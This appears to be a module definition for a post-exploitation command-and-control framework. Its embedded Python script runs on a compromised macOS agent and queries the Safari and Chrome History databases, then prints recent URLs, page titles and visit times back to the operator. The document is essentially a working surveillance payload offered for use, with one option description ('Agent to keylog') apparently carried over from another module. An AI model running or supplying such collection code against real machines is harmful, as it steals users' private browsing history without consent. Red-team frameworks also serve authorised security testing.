name: Browser Dump
authors:
  - name: ''
    handle: '@424f424f'
    link: https://twitter.com/424f424f
description: This module will dump browser history from Safari and Chrome.
software: ''
tactics: []
techniques:
  - T1217
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: python
min_language_version: '2.6'
comments:
  - https://gist.github.com/dropmeaword/9372cbeb29e8390521c2
options:
  - name: Agent
    description: Agent to keylog.
    required: true
    value: ''
  - name: Number
    description: Number of URLs to return.
    required: true
    value: '3'
script: |-
  import sqlite3
  import os

  number = ''
  class browser_dump():
      def __init__(self):
          try:
              print("[*] Dump Started!")
          except Exception as e:
              print(e)

      def func(self, number):
          print("Dumping safari...")
          print("")
          try:

              from os.path import expanduser
              home = expanduser("~") + '/Library/Safari/History.db'
              if os.path.isfile(home):

                  conn = sqlite3.connect(home)
                  cur = conn.cursor()
                  cur.execute("SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;")
                  statment = cur.fetchall()
                  number = {{ Number }} * -1
                  for item in statment[number:]:
                      print(item)

                  conn.close()
          except Exception as e:
              print(e)
          print("")
          print("Dumping Chrome...")
          print("")
          try:

              from os.path import expanduser
              home = expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History'
              if os.path.isfile(home):
                  conn = sqlite3.connect(home)
                  cur = conn.cursor()
                  cur.execute("SELECT datetime(last_visit_time/1000000-11644473600, \\"unixepoch\\") as last_visited, url, title, visit_count FROM urls;")
                  statment = cur.fetchall()
                  number = {{ Number }} * -1
                  for item in statment[number:]:
                      print(item)

                  conn.close()
          except Exception as e:
              print("error")
              print(e)


  s = browser_dump()
  s.func(number)
